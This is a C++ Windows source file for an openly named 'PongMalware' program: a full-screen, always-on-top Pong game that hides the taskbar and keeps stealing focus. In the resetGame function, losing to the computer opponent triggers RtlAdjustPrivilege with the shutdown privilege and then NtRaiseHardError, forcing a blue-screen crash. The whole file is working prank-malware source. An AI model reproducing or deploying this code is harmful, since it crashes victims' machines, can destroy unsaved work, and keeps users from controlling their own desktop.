// test1.cpp : Defines the entry point for the application.
//

#include "PongMalware.h"

// Global Variables:
HINSTANCE hInst;
ITaskbarList3* taskbar;
HWND hWnd;
RECT g_desktopRect;
wchar_t g_szClassName[] = L"myClassName";
HFONT font;
COLORREF color;
HBRUSH whiteBrush;
HBRUSH blackBrush;
HWND taskWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);;
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);


struct bouncy;
struct wall;
void fuckshit(RECT& rect, wall& wall);
bool down = false , up = false, impossible = false;

struct bouncy {
    int x = 0;
    int y = 0;
    int xforce = 0;
    int yforce = 0;
    int speed = 5;
    int width = 0;
    int height = 0;
    RECT rect{};
};

struct wall {
    int y = 0;
    int x = 0;
    RECT rect{};
    int score =0;
};

struct drawings {
    RECT* score=nullptr;
    RECT* scoreTags=nullptr;
};

struct pong {
    bouncy ball{};
    wall player{};
    wall opponent{};
    drawings draw{};
    int wallHeight = 0;
    int wallWidth = 0;
    int debounce = 10;
    int debounceBarrier = 10;
    int debounceMax = 10;
};
pong pongers;
void fuckshit(RECT& rect, wall& wall) {
    rect.left = wall.x;
    rect.right = wall.x + pongers.wallWidth;
    rect.top = wall.y;
    rect.bottom = wall.y + pongers.wallHeight;
}
void fuckball(RECT& rect, bouncy& ball) {
    rect.left = ball.x;
    rect.right = ball.x + ball.width;
    rect.top = ball.y;
    rect.bottom = ball.y + ball.height;
}

void resetGame() {
    if (pongers.player.score == 5) {
        PostMessage(hWnd, WM_CLOSE, NULL, NULL);
    }
    else if (pongers.opponent.score == 5) {
        BOOLEAN PrivilegeState = FALSE;
        ULONG ErrorResponse = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
    }
    pongers.opponent.y = (g_desktopRect.bottom - g_desktopRect.top) / 2 - pongers.wallHeight;
    pongers.player.y = (g_desktopRect.bottom - g_desktopRect.top) / 2 - pongers.wallHeight;
    pongers.ball.x = (g_desktopRect.right - g_desktopRect.left)/2-pongers.ball.width;
    pongers.ball.y = (g_desktopRect.bottom - g_desktopRect.top)/2 - pongers.ball.height;
    pongers.ball.xforce *= -1;
    int angle = rand() % 2;
    pongers.ball.yforce *= angle == 0 ? 1 : angle;
    RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);
}

bool isColliding() {
    bool y = pongers.ball.xforce > 0 ? pongers.player.rect.top <= pongers.ball.rect.top && pongers.player.rect.bottom >= pongers.ball.rect.bottom : pongers.opponent.rect.top <= pongers.ball.rect.top && pongers.opponent.rect.bottom >= pongers.ball.rect.bottom;
    bool x = pongers.ball.xforce > 0 ? pongers.player.rect.left <= pongers.ball.rect.right : pongers.opponent.rect.right >= pongers.ball.rect.left;
    return x && y;
}

void move(wall& wall, int amount) {
    if (wall.y + amount < g_desktopRect.top) {
        wall.y = g_desktopRect.top;
        return;
    }
    if (wall.y + pongers.wallHeight + amount > g_desktopRect.bottom - g_desktopRect.top) {
        wall.y = g_desktopRect.bottom - g_desktopRect.top - pongers.wallHeight;
        return;
    }
    wall.y += amount;
}

void processBouncy() {
    while (true) {
        SetForegroundWindow(hWnd);
        pongers.ball.x += pongers.ball.xforce*pongers.ball.speed;
        pongers.ball.y += pongers.ball.yforce*pongers.ball.speed;
        if (pongers.ball.xforce < 0) {
            if (pongers.opponent.y + (pongers.wallHeight / 2) > pongers.ball.y + (pongers.ball.height / 2)) {
                move(pongers.opponent, impossible ? -5 : -4);
            }
            else {
                move(pongers.opponent, impossible ? 5 : 4);
            }
        }
        if (up) {
            move(pongers.player, -4);
        }
        else if (down) {
            move(pongers.player, 4);
        }
        // HANDLE THE FUCKING SCORE
        if (pongers.ball.x <= g_desktopRect.left) {
            pongers.player.score++;
            resetGame();
        }
        else if (pongers.ball.x + pongers.ball.width >= g_desktopRect.right - g_desktopRect.left) {
            pongers.opponent.score++;
            resetGame();
        }
        if (pongers.debounce < pongers.debounceMax) {
            pongers.debounce++;
        }
        if (pongers.debounceBarrier < pongers.debounceMax) {
            pongers.debounceBarrier++;
        }
        fuckshit(pongers.player.rect, pongers.player);
        fuckshit(pongers.opponent.rect, pongers.opponent);
        fuckball(pongers.ball.rect, pongers.ball);
        if (isColliding()) {
            if (pongers.debounce == pongers.debounceMax) {
                pongers.ball.xforce *= -1;
                pongers.debounce = 0;
            }
        }
        if ((pongers.ball.y <= g_desktopRect.top) || (pongers.ball.y+pongers.ball.height >= g_desktopRect.bottom-g_desktopRect.top)) {
            if (pongers.debounceBarrier == pongers.debounceMax) {
                pongers.debounceBarrier = 0;
                pongers.ball.yforce *= -1;
            }
        }
        RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);
        Sleep(1);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        // TODO: Add any drawing code that uses hdc here...
        SetTextColor(hdc, color);
        SelectObject(hdc, font);
        SetBkMode(hdc, TRANSPARENT);
        RECT rect;
        GetClientRect(hWnd, &rect);
        FillRect(hdc, &rect, blackBrush);
        fuckshit(pongers.opponent.rect, pongers.opponent);
        FillRect(hdc, &pongers.opponent.rect, whiteBrush);
        fuckshit(pongers.player.rect, pongers.player);
        FillRect(hdc, &pongers.player.rect, whiteBrush);
        Ellipse(hdc, pongers.ball.x, pongers.ball.y, pongers.ball.x + pongers.ball.width, pongers.ball.y + pongers.ball.height);
        std::string string = std::to_string(pongers.opponent.score).c_str(); string = string.append(" : ").c_str();string = string.append(std::to_string(pongers.player.score).c_str());
        std::wstring strtemp = std::wstring(string.begin(), string.end());
        LPCWSTR sw = strtemp.c_str();
        DrawText(hdc,sw, wcslen(sw), pongers.draw.score, DT_CENTER);
        EndPaint(hWnd, &ps);
    }
    break;
    case WM_DESTROY:
        ShowWindow(taskWnd, SW_SHOWDEFAULT);
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
        if (wParam == VK_UP) {
            up = true;
        }
        else if(wParam == VK_DOWN){
            down = true;
        }
        break;
    case WM_KEYUP:
        if (wParam == VK_UP) {
            up = false;
        }
        else if (wParam == VK_DOWN) {
            down = false;
        }
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    font = CreateFontA(100, 50, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, NONANTIALIASED_QUALITY, DEFAULT_PITCH, NULL);
    color = RGB(255, 255, 255);
    whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
    blackBrush = CreateSolidBrush(RGB(0, 0, 0));
    srand(time(NULL));
    GetClientRect(GetDesktopWindow(), &g_desktopRect);
    WNDCLASSEX wc;
    MSG msg;
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, MAKEINTRESOURCE(IDI_PONGMALWARE));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = blackBrush;
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(NULL, MAKEINTRESOURCE(IDI_PONGMALWARE));
    RegisterClassEx(&wc);
    hWnd = CreateWindowEx(
        WS_EX_COMPOSITED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_LAYERED,
        g_szClassName,
        NULL,
        WS_POPUP,
        CW_USEDEFAULT, CW_USEDEFAULT, g_desktopRect.right-g_desktopRect.left, g_desktopRect.bottom-g_desktopRect.top,
        NULL, NULL, hInstance, NULL
    );
    //SetLayeredWindowAttributes(hWnd, 0, (255 * 60) / 100, LWA_ALPHA);
    ShowWindow(taskWnd, SW_HIDE);
    pongers.wallHeight = (int) (g_desktopRect.bottom - g_desktopRect.top) / 7;
    pongers.wallWidth = (int) (g_desktopRect.bottom - g_desktopRect.top) / 30;
    pongers.opponent.x = g_desktopRect.left + 10;
    pongers.player.x = g_desktopRect.right - g_desktopRect.left - pongers.wallWidth - 10;
    pongers.player.y = (g_desktopRect.bottom - g_desktopRect.top) /2 - pongers.wallHeight;
    pongers.opponent.y = (g_desktopRect.bottom - g_desktopRect.top) / 2 - pongers.wallHeight;
    pongers.ball.height = 25;
    pongers.ball.width = 25;
    RECT score{};
    score.left = (g_desktopRect.right - g_desktopRect.left) / 2 - 300;
    score.right = (g_desktopRect.right - g_desktopRect.left) / 2 + 300;
    score.top = g_desktopRect.top + 50;
    score.bottom = score.top + 150;
    pongers.draw.score = &score;
    ShowWindow(hWnd, nCmdShow);
    ShowWindow(hWnd, SW_MAXIMIZE);
    UpdateWindow(hWnd);
    if (rand() % 2) {
        pongers.ball.xforce = 1;
    }
    else {
        pongers.ball.xforce = -1;
    }
    if (rand() % 2) {
        pongers.ball.yforce = -1;
    }
    else {
        pongers.ball.yforce = 1;
    }
    resetGame();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&processBouncy, 0, 0, NULL);
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}



